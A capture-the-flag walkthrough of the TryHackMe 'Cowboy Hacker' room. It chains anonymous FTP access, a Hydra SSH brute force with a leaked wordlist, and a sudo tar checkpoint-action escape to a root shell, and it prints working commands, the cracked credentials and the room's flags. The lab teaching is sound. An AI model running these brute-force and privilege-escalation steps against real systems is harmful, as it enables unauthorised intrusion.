# Cowboy Hacker — Full Exploitation Walkthrough

## Room Overview

**Cowboy Hacker** is an easy, beginner-friendly exploitation room on TryHackMe. It walks a single attack chain from an anonymous FTP login all the way to a root shell. The room was completed from the THM **AttackBox** (web-based Kali) because the local machine had no OpenVPN connection — and the local FTP client could not establish a data connection to the target.

## Step 1: Service Enumeration

An Nmap scan against `10.49.172.169` reveals three listening services:

| Port   | Service | Version      |
| ------ | ------- | ------------ |
| 21/tcp | FTP     | vsFTPd 3.0.5 |
| 22/tcp | SSH     | OpenSSH      |
| 80/tcp | HTTP    | Apache       |

The FTP banner alone (`220 (vsFTPd 3.0.5)`) already confirms the FTP version before any request is made.

## Step 2: Anonymous FTP Access

The FTP server allows anonymous login with a blank password:

```
$ ftp 10.49.172.169
220 (vsFTPd 3.0.5)
Name (10.49.172.169:l): Anonymous
230 Login successful.
Remote system type is UNIX.
```

### Troubleshooting Detour — the broken FTP data channel

On the local machine, authentication worked but the **data connection** did not:

- **Active mode**: `425 Failed to establish connection.` — the server's connection back to the client is blocked.
- **Passive mode**: the server refuses it (`Passive mode refused.` / `550 Permission denied.`).

Because `ls`, `dir`, and `get` all need a data channel, directory listing and file retrieval were impossible from the local setup. This is an environment/network-path problem, not a target misconfiguration.

**Resolution:** switch to the THM AttackBox, where the room's FTP data connection behaves as intended. From there the two files in the anonymous directory are listed and downloaded:

- `task.txt` — the admin's task list
- `locks.txt` — a password wordlist

Filename discovery note: the names `task.txt` and `locks.txt` are confirmed by the room itself — the room question text describes "a task list" and "a text file used for a password audit". On an unknown real system you would not guess these names; you would list the anonymous directory and read what you find.

## Step 3: SSH Brute-Force with the Leaked Wordlist

The target also exposes SSH on port 22. With the room user identified (`lin`) and a password wordlist in hand (`locks.txt`), Hydra brute-forces the SSH password:

```
hydra -l lin -P locks.txt ssh://10.49.172.169
```

Result: `lin:RedDr0gonSynd1cat3`.

This is the classic "one leaked file enables the next attack" pattern — the FTP server hands you the exact wordlist you need for the next service.

## Step 4: SSH Login and the User Flag

```
ssh lin@10.49.172.169
```

Once logged in, read the first flag from the home directory:

```
lin@ip-10-48-154-189:~$ cat user.txt
THM{CRIM3_SyNd1C4T3}
```

**user.txt:** `THM{CRIM3_SyNd1C4T3}`

## Step 5: Privilege Escalation — Abusing `/bin/tar`

The first thing to check after landing on a box is what the current user can run with elevated privileges:

```
lin@ip-10-48-154-189:/$ sudo -l

User lin may run the following commands on ...:
    (root) /bin/tar
```

`lin` can run `/bin/tar` as root **without a password**. The user can only run `tar` — not a shell — but `tar` is a well-known GTFOBins binary that can execute arbitrary commands via its checkpoint feature:

```
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

How it works:

- `--checkpoint=1` — print/trigger a checkpoint message every Nth record
- `--checkpoint-action=exec=/bin/sh` — run `/bin/sh` at each checkpoint
- `tar` runs as root (via sudo), so the spawned shell is **root**
- `/bin/tar: Removing leading '/' from member names` is just tar normalizing absolute paths

The result is a root shell (`#`):

```
# cd /root
# cat root.txt
THM{B0UNTY_h4cK3r}
```

**root.txt:** `THM{B0UNTY_h4cK3r}`

## Conclusion

This room is a clean four-stage chain:

1. **Anonymous FTP** → task list + password wordlist
2. **SSH brute-force** with the leaked wordlist → initial foothold (`lin`) and `user.txt`
3. **`sudo -l`** → `/bin/tar` is runnable as root
4. **GTFOBins `tar` escape** → root shell and `root.txt`

Every stage is a class of weakness found constantly in the real world: anonymous services, credential reuse via leaked wordlists, and permissive sudo rules that allow an escapeable binary to run as root.
